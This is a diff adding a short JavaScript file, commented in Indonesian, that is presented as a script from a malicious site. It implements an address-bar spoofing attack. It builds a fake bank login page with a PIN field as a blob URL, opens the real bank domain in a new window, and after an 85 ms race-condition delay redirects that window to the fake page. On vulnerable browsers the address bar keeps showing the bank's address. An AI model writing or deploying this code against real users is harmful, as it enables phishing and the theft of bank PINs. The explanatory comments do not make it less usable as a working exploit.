@@ -1,0 +1,23 @@
+// Script di situs jahat (diskon-palsu.id)
+
+function startSpoof() {
+    // 1. Buat konten palsu
+    const fakeContent = "<h1>Login Bank Aman</h1><input type='password' placeholder='PIN'>";
+    const blob = new Blob([fakeContent], {type: 'text/html'});
+    const blobUrl = URL.createObjectURL(blob);
+
+    // 2. Buka jendela baru ke target asli
+    const win = window.open("https://bankaman.com", "_blank");
+
+    // 3. Race Condition: Ganggu proses loading
+    // Kita menunggu timing yang sangat spesifik (misal 50-100ms)
+    setTimeout(() => {
+        if (win) {
+            // Mengalihkan konten jendela tanpa mengubah URL yang sudah 'committed' di bar
+            win.location.href = blobUrl; 
+            
+            // Pada beberapa browser rentan, Address Bar tetap 'bankaman.com' 
+            // tapi konten yang tampil adalah isi dari blobUrl.
+        }
+    }, 85); 
+}
